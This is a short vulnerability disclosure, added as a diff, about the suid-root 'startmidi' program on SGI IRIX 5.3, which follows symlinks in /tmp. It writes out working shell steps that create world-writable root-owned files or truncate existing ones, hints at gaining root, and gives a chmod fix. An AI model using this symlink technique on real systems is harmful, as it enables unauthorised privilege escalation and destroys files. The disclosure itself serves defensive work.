@@ -1,0 +1,20 @@
+Whilst browsing around the filesystem on my SGI (running IRIX 5.3), I
+noticed a little suid-root program called 'startmidi' which hides in
+/usr/sbin. When run, this program creates various files in /tmp. You
+guessed it, it respects umask and follows symlinks. Comme ca:
+
+% umask 0
+% ln -s /blardyblar /tmp/.midipid
+% startmidi -d /dev/ttyd1
+% ls -l /blardyblar
+-rw-rw-rw-    1 root     pgrad          0 Feb  9 17:46 /blardyblar
+% stopmidi -d /dev/ttyd1
+%
+
+Any existing files are trucated to zero length. New files are created
+root-owned, mode 0666. I leave it to your furtive imaginations to get
+root from this. 'stopmidi' removes the files created by 'startmidi' so
+you may have to run that first if /tmp/.midipid already exists.
+
+chmod -s /usr/sbin/startmidi fixes this problem.
+
